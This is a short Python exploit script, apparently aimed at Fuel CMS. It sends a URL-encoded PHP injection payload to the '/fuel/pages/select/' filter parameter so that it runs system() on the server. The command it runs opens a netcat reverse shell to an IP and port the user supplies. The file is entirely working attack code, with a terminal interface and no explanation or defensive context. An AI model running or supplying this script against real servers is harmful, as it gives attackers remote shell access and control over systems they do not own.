import requests
import json
import urllib.parse
import sys
import time
from blessed import Terminal

term = Terminal()

def send_payload(vuln_url, command):
    payload = vuln_url + "/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27" + urllib.parse.quote(command) + "%27%29%2b%27"
    response = requests.get(payload)
    return response

def main():
    print(term.bold('Welcome to Reverse Shell Payload Injector\n'))

    rev_shell_ip = input("Enter the IP address of the reverse shell: ")
    port = input("Enter the port of the reverse shell: ")
    vuln_url = input("Enter the URL of the vulnerable server: ")

    command = f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc {rev_shell_ip} {port} >/tmp/f"

    print(term.bold('\nSending payload...\n'))
    

    with term.location(0, term.height - 3):
        with term.cbreak():
            print(term.black_on_white('Loading...'))
            time.sleep(1)

    response = send_payload(vuln_url, command)

    print(term.bold('\nPayload Sent! Response:\n'))
    print(json.dumps(response.json(), indent=4))

if __name__ == "__main__":
    with term.fullscreen():
        with term.hidden_cursor():
            main()
